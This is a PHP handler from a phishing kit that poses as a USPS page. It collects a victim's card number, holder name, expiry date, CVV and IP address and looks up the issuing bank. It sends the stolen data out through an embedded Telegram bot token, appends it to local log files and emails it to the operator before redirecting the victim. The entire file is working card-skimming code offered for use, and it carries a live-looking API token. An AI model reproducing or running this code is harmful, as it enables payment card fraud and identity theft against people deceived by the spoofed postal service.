<?php
include "anti/index.php";
include "mailto.php";
include "id.php";
if(isset($_POST['okbb'])){
$ip = getenv("REMOTE_ADDR");
$bin        = str_replace(' ', '', $_POST['ccnumb']);
$bin        = substr($bin, 0, 6);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
$message = "-------------------- <3 USPS <3-------------------\nCC HOLDER : ".$_POST['mccholder']."\ncc  : ".$_POST['ccnumb']." (".$_SESSION['_namebank_'].")\nexpmonth : ".$_POST['mmonth']."\nexpyear : ".$_POST['myears']."\ncvv : ".$_POST['cvvz']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot1834563751:AAHvd5FWcQ_AULvpqA5S3t7I0cnI6b9euwA/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);


$myfilez = fopen("rzltcc.txt", "a+");
$txzt = $message;
fwrite($myfilez, $txzt);
fclose($myfilez);
	$subject="❤ PaLEsTiNi ❤ [".$_POST['mccholder']."] From [".$ip."]";
	$headers="From: 📬 USPS 📬 <newlogin@palestini.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	@mail($yours,$subject,$message,$headers);
if ($sms=='1'){
HEADER("Location: index3.php");
}else{
HEADER("Location: thanks.php");
}
}
?>